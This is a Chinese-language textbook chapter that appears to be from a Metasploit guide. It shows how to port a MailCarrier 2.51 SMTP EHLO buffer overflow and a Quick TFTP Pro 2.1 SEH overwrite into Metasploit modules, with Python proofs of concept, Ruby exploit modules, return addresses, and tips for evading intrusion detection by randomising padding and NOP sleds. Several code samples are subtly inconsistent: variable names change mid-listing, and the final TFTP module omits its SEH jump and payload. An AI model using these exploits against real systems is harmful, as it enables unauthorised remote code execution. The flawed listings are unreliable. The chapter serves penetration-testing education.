# 第12章：将漏洞移植到框架中

并非所有漏洞都是为 Metasploit 或用 Ruby 编写的；有些是用 Perl、Python、C、C++ 或其他语言编写的。你可能出于多种原因选择将漏洞从其他格式转换为 Metasploit 格式，其中很重要的一个原因是为社区和框架做出贡献。

当你将漏洞移植到 Metasploit 时，你会将现有的独立漏洞（例如 Python 或 Perl 脚本）转换为 Metasploit 内部可用的格式。导入漏洞后，你可以利用框架的许多高级工具来处理常规任务。此外，尽管独立漏洞通常依赖于你使用特定的 payload 或操作系统，但一旦它们被移植到框架中，你就可以即时生成 payload，并在多种场景中使用该漏洞。

本章将引导你完成将两个独立漏洞移植到框架的过程：一个是缓冲区溢出攻击，另一个是结构化异常处理覆盖。基于你对这些基本概念的了解，再加上一些努力，你将能够自己开始将漏洞移植到框架中。

## 汇编语言基础

要充分利用本章内容，你需要对 Intel x86 汇编编程语言有基本的了解，因为我们会用到许多底层汇编指令和命令。让我们来看最常见的几个。

### EIP 和 ESP 寄存器

寄存器是快速的 CPU 内存位置，用于存储程序运行所需的信息。就本章而言，最重要的两个寄存器是 EIP（扩展指令指针寄存器）和 ESP（扩展栈指针寄存器）。

EIP 中的值告诉 CPU 下一步将要执行的指令的内存地址。在本章中，我们将用恶意 shellcode 的地址覆盖 EIP 返回地址。ESP 寄存器存储栈顶的地址。在缓冲区溢出攻击中，我们会用恶意代码覆盖正常的应用程序数据，从而导致崩溃。

### JMP 指令集

JMP ESP 指令是“跳转”到存储在 ESP（栈指针）中的内存地址。在我们本章将要探讨的溢出示例中，我们使用 JMP ESP 指令告诉程序计数器跟随栈指针（ESP）到包含我们 shellcode 的内存地址。

### NOP 与 NOP 滑板

NOP 是无操作指令。有时当你触发溢出时，你并不确切知道你将落在已分配空间内的哪个位置。NOP 指令只是对计算机说：“看到我就什么也不做”，其十六进制表示为 `\x90`。

NOP 滑板是由多个 NOP 组合而成，用于滑向我们的 shellcode。当我们触发并执行 JMP 指令时，会碰到一堆 NOP，我们将沿着它们下滑，直到碰到我们的 shellcode。你可以将 NOP 滑板想象成一张用来捕获我们的跳转的大网。

## 禁用保护

在你的 Windows 虚拟机中，让我们禁用 Windows 系统用于防御本章所述攻击的一些保护机制。我们将在后续章节中讨论如何绕过这些防御，但现在先专注于熟悉编写漏洞并将其移植到 Metasploit 中。

首先，通过打开注册表编辑器 `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Kernel`，并将 `DisableExceptionChainValidation` 的值设置为 1，来禁用 SEHOP 保护，如图 12-1 所示。

## 移植缓冲区溢出

我们的第一个示例是一个典型的远程缓冲区溢出。要执行缓冲区溢出，攻击者会用超过缓冲区预期的数据量来覆盖缓冲区。在这个例子中，我们使用 A 来填充缓冲区直到溢出。比如说，如果函数的返回地址也存储在栈上，那么如果我们溢出栈，最终将用我们自己的值覆盖这个返回地址，从而控制处理器接下来执行的代码。

这个漏洞称为 MailCarrier 2.51 SMTP EHLO/HELO 缓冲区溢出，它利用 MailCarrier 2.51 SMTP 命令导致缓冲区溢出。此次攻击将用我们 shellcode 的地址覆盖函数的返回地址，shellcode 也将存储在缓冲区中。

为此，我们只需要一个跳转到扩展栈指针（JMP ESP）就能到达 shellcode。这个 JMP ESP 指令通常被称为“gadget”。可以将多个 gadget 组合起来绕过其他防御。在这里，我们将使用 JMP ESP gadget 来绕过地址空间布局随机化防御。

你可以在 https://www.exploit-db.com/exploits/598 找到该漏洞和易受攻击的应用程序。点击页面上的“Vulnerable App”下载易受攻击的应用。下载 MailCarrier 2.5 后，用它来设置一个新的邮件服务器。

然后，打开 Windows 开始菜单，搜索“高级安全 Windows Defender 防火墙”以打开防火墙；你需要在防火墙中开放端口 25、110 和 143，以便邮件服务器能够与其他应用程序通信。选择“新建规则”，并按照向导说明创建新的端口规则。对这三个端口重复此过程。请注意，开放这些端口是安装应用程序的一部分；你并非故意降低服务器的安全性。

这是一个较老的漏洞，因此它的运行效果可能不如你期望的那么好。但稍加努力，你可以在你的环境中让它运行起来。经过一段时间的调查不同的缓冲区长度后，你会发现有超过 1000 字节可用于 shellcode，并且缓冲区长度需要调整 4 字节。

以下是该漏洞的新概念验证代码（概念验证漏洞包含展示漏洞所需的基本代码，但不携带实际 payload，并且在许多情况下，它们需要大量修改才能正常工作）：

```python
#!/usr/bin/python
#########################################################
# MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow     #
# Advanced, secure and easy to use Mail Server.         #
#                                                       #
#########################################################
import struct
import socket

print("\n\n###############################################")
print("\nMailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow")
print("\nFound & coded by muts [at] whitehat.co.il")
print("\nFor Educational Purposes Only!\n")
print("\n\n###############################################")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = b"\x41" * 5094  # AAAAA..
buffer += b"\x42" * 4    # BBBB
buffer += b"\x90" * 32   # NOPs
buffer += b"\xcc" * 1000 # Placeholder for shell code

try:
    print("\nSending evil buffer...")
    s.connect(('192.168.1.155', 25))
    s.send(b'EHLO ' + buffer + b'\r\n')
    data = s.recv(1024)
    s.close()
    print("\nDone!")
except:
    print("Could not connect to SMTP!")
```

我们已经移除了 shellcode，并用一个字符串（BBBB）覆盖 EIP 寄存器来替换跳转指令。正如你可能想象到的，将独立漏洞移植到 Metasploit 中最快、最简单的方法是修改框架中类似的现有漏洞。所以，接下来我们就这么做。

## 精简现有漏洞

作为移植 MailCarrier 漏洞的第一步，我们将把现有的 Metasploit 模块精简为一个简单的骨架文件：

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp  # ❶

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'TABS MailCarrier v2.51 SMTP EHLO Overflow',
      'Description' => %q{
        This module exploits the MailCarrier v2.51 SMTP service.
        The stack is overwritten when sending an overly long EHLO command.
      },
      'Author'      => ['Your Name'],
      'Arch'        => [ARCH_X86],
      'License'     => MSF_LICENSE,
      'Version'     => '$Revision: 7724 $',
      'References'  =>
        [
          [ 'CVE', '2004-1638' ],
          [ 'OSVDB', '11174' ],
          [ 'BID', '11535' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/598' ],
        ],
      'Privileged'     => true,
      'DefaultOptions' => { 'EXITFUNC' => 'thread' },
      'Payload'        =>
        {
          'Space' => 300,
          'BadChars' => "\x00\x0a\x0d\x3a",
          'StackAdjustment' => -3500,
        },
      'Platform' => ['win'],
      'Targets'  =>
        [
          ['Windows - EN',   {'Ret' => 0xdeadbeef}],  # ❷
        ],
      'DisclosureDate' => 'Oct 26 2004',
      'DefaultTarget'  => 0))
    register_options(
      [
        Opt::RPORT(25),   # ❸
        Opt::LHOST(),     # Required for stack offset
      ], self.class)
  end

  def exploit
    connect
    sock.put(sploit + "\r\n")  # ❹
    handler
    disconnect
  end
end
```

由于此漏洞不需要身份验证，我们使用 mixin `Msf::Exploit::Remote::Tcp` ❶。Mixin 允许你使用内置协议，如 `Remote::Tcp` 来执行基本的远程 TCP 通信。

目标返回地址设置为虚假值 `0xdeadbeef` ❷，默认 TCP 端口设置为 25 ❸。连接到目标后，Metasploit 将使用 `sock.put` 通过套接字发送恶意漏洞代码 ❹。接下来，让我们构建我们的漏洞代码。

## 配置漏洞定义

要配置漏洞定义，我们需要向服务提供五样东西：（1）协议要求的问候语，（2）一个大缓冲区，（3）我们将控制 EIP 的占位符，（4）一个简短的 NOP 滑板，以及（5）我们的 shellcode 占位符。代码如下：

```ruby
def exploit
  connect
  sploit = "EHLO"
  sploit << "\x41" * 5094
  sploit << "\x42" * 4
  sploit << "\x90" * 32           # ❶
  sploit << "\xcc" * 1000
  sock.put(sploit + "\r\n")
  handler
  disconnect
end
```

恶意缓冲区是根据原始漏洞代码构建的。它以 EHLO 命令开头，后跟一长串 A（精确地说是 5,094 个），4 个字节用于覆盖 EIP 寄存器，一个小型 NOP 滑板，然后是一些 dummy shellcode。在这里，dummy shellcode 由一组调试器断点命令（`\xCC`）组成 ❶，这应该会使进程暂停，而无需我们设置断点。

配置好漏洞部分后，将文件保存为 `mailcarrier_book.rb`，放在 `modules/exploits/windows/smtp/` 目录下。

## 实现框架特性

在通过覆盖 EIP 地址证明了模块的基本骨架工作正常之后，我们可以开始慢慢扩展模块，使其使用框架的特性。首先，我们需要找到一个合法的返回地址，以确保代码在我们所针对的操作系统上正确执行。请记住，有些漏洞只在特定的操作系统上有效，此漏洞就是这种情况。

我们将目标返回地址设置为在 Windows 上的 SHELL32.DLL 中找到的 JMP ESP 地址。为了在此 Windows 版本上找到这个 JMP ESP 指令，我们将使用 `mona.py`，这是一个 Immunity Debugger 的 Python 脚本，可以快速执行搜索。从 https://github.com/corelan/mona 下载它，并将 `mona.py` 文件复制到 Immunity 安装目录下的 `PyCommands` 子文件夹中。

然后，在调试器中输入 `!mona jmp -r esp` 命令，搜索 JMP ESP 指令的地址。将该地址（在以下代码中以粗体显示）复制到漏洞代码的 `Targets` 块中：

```ruby
'Targets' => [
  ['Windows - EN', {'Ret' => 0x0F9e24F9}],
],
```

接下来，将漏洞块中的返回地址替换为 `[target['Ret']].pack('v')`。这将把目标返回地址插入漏洞中，并以小端格式反转字节。字节顺序由目标 CPU 的体系结构决定；与 Intel 兼容的处理器使用小端字节序：

```ruby
splot = "EHLO"
splot << "\x41" * 5094
splot << [target['Ret']].pack('V')
splot << "\x90" * 32
splot << "\xcc" * 1000
```

如果你声明了多个目标，加粗的那行代码将根据你在运行漏洞时选择的目标来选择正确的返回地址。请注意，将漏洞移植到框架中已经增加了其多功能性！

重新执行漏洞模块应该会成功跳转到 INT3 dummy shellcode 指令，你可以在调试器中看到这一点。

## 添加随机化

大多数入侵检测系统（IDS）在检测到网络上传输的长字符串 A 时会触发警报，因为这是漏洞中常用的模式。因此，最好在漏洞中引入尽可能多的随机化，因为这样做可以绕过许多特定于漏洞的签名。

为了给这个漏洞增加随机性，编辑模块 `super` 块中的 `Targets` 部分，使其包含覆盖 EIP 之前所需的偏移量：

```ruby
'Targets' => [
  ['Windows - EN', {'Ret' => 0x7d17dd13, 'Offset' => 5094}],  # ❶
],
```

请注意，内存地址将根据操作系统平台而有所不同。通过在此处声明偏移量，你将不再需要在漏洞本身中手动包含 A 字符串。这是一个非常有用的特性，因为在某些情况下，缓冲区长度会因操作系统版本而异。

现在，我们可以编辑漏洞部分，让 Metasploit 在运行时生成一个随机的大写字母字符串，而不是 5,094 个 A：

```ruby
splot = "EHLO "
splot << rand_text_alpha_upper(target['Offset'])
splot << [target['Ret']].pack('V')
splot << "\x90" * 32
splot << "\xcc" * 1000
```

从此时起，每次运行漏洞都将拥有一个唯一的缓冲区。我们使用 `rand_text_alpha_upper` 来实现这一点。

## 移除 NOP 滑板

下一步是移除明显的 NOP 滑板，因为这也是经常触发 IDS 的另一个项。虽然 `\x90` 是最著名的无操作指令，但它并不是唯一可用的。我们可以在模块的漏洞部分使用 `make_nops` 函数，告诉 Metasploit 使用随机的 NOP 等效指令：

```ruby
splot = "EHLO "
splot << rand_text_alpha_upper(target['Offset'])
splot << [target['Ret']].pack('V')
splot << make_nops(32)
splot << "\xcc" * 1000
```

再次运行模块并检查调试器，它应该暂停在 INT3 指令上。熟悉的 NOP 滑板应该已被看似随机的字符所取代。

## 移除 Dummy Shellcode

在模块的所有部分都正常工作后，我们现在可以移除 dummy shellcode。编码器将排除在模块的 `super` 块中声明的坏字符。按如下方式编辑漏洞部分：

```ruby
splot = "EHLO "
splot << rand_text_alpha_upper(target['Offset'])
splot << [target['Ret']].pack('V')
splot << make_nops(32)
splot << payload.encoded
```

`payload.encoded` 函数告诉 Metasploit 在运行时将指定的 payload 附加到恶意字符串的末尾。现在，当我们加载模块、设置真实的 payload 并执行它时，我们应该会得到我们辛勤劳动换来的 Meterpreter 会话：


## 移植 SEH 覆盖漏洞

在本节中，你将把针对 Quick TFTP Pro 2.1 的结构化异常处理覆盖漏洞转换为 Metasploit 格式。当发生重大错误或崩溃时，系统会尝试优雅地关闭应用程序，而 SEH 覆盖是指你能够绕过这种处理机制。你将利用 SEH，使得当应用程序触发异常时，EIP 将指向一个你控制的指针，从而可以将执行流导向你的 shellcode。

这个漏洞本身比简单的缓冲区溢出稍微复杂一些，但非常巧妙。与前一节的缓冲区溢出类似，我们用一个 gadget 覆盖处理程序。在这里，我们使用 POP-POP-RETN gadget 的起始地址。目前，我们可以将 POP-POP-RETN 视为帮助我们跳转到 shellcode 的 gadget；我们将在第 14 章中更详细地讨论它。

Quick TFTP Pro 2.1 漏洞由 Muts 编写，你可以在 https://www.exploit-db.com/exploits/5315 找到其代码以及易受攻击的目标应用程序。以下是原始漏洞代码。我们已经对其进行了精简，例如移除了 payload，以使其更易于移植到 Metasploit：

```python
#!/usr/bin/python
# Quick TFTP Pro 2.1 SEH Overflow (0day)
# Tested on Windows
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/quick-tfp-poc.py.txt

import socket
import sys

print("[*] Quick TFTP Pro 2.1 SEH Overflow (0day)")
print("[*] http://www.offensive-security.com")

host = '127.0.0.1'
port = 69

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
    print("socket() failed")
    sys.exit(1)

filename = b"pwind"
shell = b"\xcc" * 317
mode = b"A" * 1019 + b"\xeb\x08\x90\x90" + b"\x58\x14\xd3\x74" + b"\x90" * 16 + shell
muha = b"\x00\x02" + filename + b"\0" + mode + b"\0"

print("[*] Sending evil packet")
s.sendto(muha, (host, port))
```

现在，让我们为新的 Metasploit 模块创建一个骨架，类似于我们之前使用的：

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Udp  # ❶
  include Msf::Exploit::Remote::Seh  # ❷
...
```

由于此漏洞利用的是普通文件传输协议（TFTP），我们需要包含 `Msf::Exploit::Remote::Udp` 这个混入（mixin）①；又因为它会操控结构化异常处理（SEH），我们还需要包含 `Msf::Exploit::Remote::Seh` 混入 ②，以便访问处理 SEH 溢出的某些函数。TFTP 服务器通常监听 UDP 端口 69，因此我们将该端口声明为模块的默认端口 ③。最后，一旦构建好恶意字符串，我们就通过套接字将其发送出去 ④。  

现在让我们填充漏洞利用部分：

```ruby
def exploit
  connect_udp

  print_status("Trying target #{target.name}...")

  evil = "\x41" * 1019            
  evil << "\xeb\x08\x90\x90"     # ❶
  evil << "\x58\x14\xd3\x74"     # ❷
  evil << "\x90" * 16
  evil << "\xcc" * 412           # Dummy Shellcode

  sploit = "\x00\x02"            # ❸
  sploit << "pwnd"
  sploit << "\x00"
  sploit << evil
  sploit << "\x00"

  udp_sock.put(sploit)
  disconnect_udp
end
```

在初始的 A 字符串（1,019 个，十六进制表示为 `\x41`）之后，我们添加一个短跳转来覆盖下一个 SEH 处理程序 ❷。这将让我们跳出 SEH。然后，我们添加一个 POP-POP-RETN 指令序列的地址 ❸，这会将我们置于我们控制的内存区域。为了确保 TFTP 服务器将数据包识别为写入请求，我们在 shellcode 之后附加 `\x00\x02` ❹。现在，当我们加载模块并针对目标运行它时，我们的调试器应该会因 SEH 覆盖而暂停。

由于长长的 A 字符串和 NOP 滑板会触发 IDS 警报，我们将（如之前的示例）用随机选择的大写字母替换 A。我们还将用 NOP 等效指令替换 `\x90` 字符，如下面加粗的代码所示：

```ruby
evil = rand_text_alpha_upper(1019)
evil << "\xeb\x08\x90\x90"
evil << "\x58\x14\xd3\x74"
evil << make_nops(16)
evil << "\xcc" * 412
```

与往常一样，在进行每次更改后检查新模块的功能是个好主意。在你的调试器中，检查应用程序是否接受随机字符，并且 SEH 是否仍然如之前一样受控。

现在我们知道了模块仍然行为正常，可以在 `Targets` 定义中设置返回地址。此示例中的地址与原始漏洞一样，是来自 `oledlg.dll` 的 POP-POP-RETN。你可以运行 `!mona seh` 命令来查找目标平台的 POP-POP-RETN gadget：

```ruby
'Targets' => [
  ['Windows', {'Ret' => 0x74d31458}],  # ❶
],
```

接下来，我们创建一个由 1,019 字节组成的随机大写字母字符串：

```ruby
evil = rand_text_alpha_upper(1019)
evil << generate_seh_payload(target.ret)
evil << make_nops(16)
```

`generate_seh_payload` 函数使用声明的返回地址，并会自动插入短跳转（跳转使我们绕过 SEH 处理程序）。该函数为我们计算跳转，直接将我们送到 POP-POP-RETN。

最后一次使用 dummy shellcode 运行模块。我们应该看到调试器中包含大量随机字符，但返回值仍然在我们的直接控制之下。在某些情况下，随机字符可能比 NOP 更好，因为它们会欺骗许多可能正在监控网络的 IDS。许多基于签名的 IDS 可能会因大量的 NOP 而触发。

接下来，我们移除 dummy shellcode，并使用真实的 payload 运行模块以获得我们的 shell：

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Quick TFTP Pro 2.1 Long Mode Buffer Overflow',
      'Description' => %q{
        This module exploits a stack overflow in Quick TFTP Pro 2.1.
      },
      'Author'      => 'Your Name',
      'Version'     => '$Revision: 7724 $',
      'References'  =>
        [
          [ 'CVE', '2008-1610' ],
          [ 'OSVDB', '43784' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/5315' ],
        ],
      'DefaultOptions' => { 'EXITFUNC' => 'thread' },
      'Payload'        =>
        {
          'Space' => 317,
          'BadChars' => "\x00",
        },
      'Platform' => 'win',
      'Targets'  =>
        [
          ['Windows', { 'Ret' => 0x74d31458 }],
        ],
      'DefaultTarget' => 0))
    register_options(
      [
        Opt::RPORT(69),
      ], self.class)
  end

  def exploit
    connect_udp

    print_status("Trying target #{target.name}...")
    evil = rand_text_alpha_upper(1019)

    evil << make_nops(16)

    sploit = "\x00\x02"
    sploit << "pwnd"
    sploit << "\x00"
    sploit << evil
    sploit << "\x00"

    udp_sock.put(sploit)
    disconnect_udp
  end
end
```

## 总结

本章旨在帮助你理解如何将不同的独立漏洞移植到 Metasploit 框架中。有几种方法可以将代码导入框架，不同的漏洞需要不同的方法和技术。

在本章开始时，你学习了如何使用一些基本的汇编指令来执行简单的栈溢出并将其移植到框架中。然后我们转向了 SEH 覆盖，我们能够利用它绕过处理程序并获得远程代码执行。我们使用了 POP-POP-RETN 技术来获得远程执行代码的能力，并使用了 Metasploit 来打开一个 Meterpreter shell。
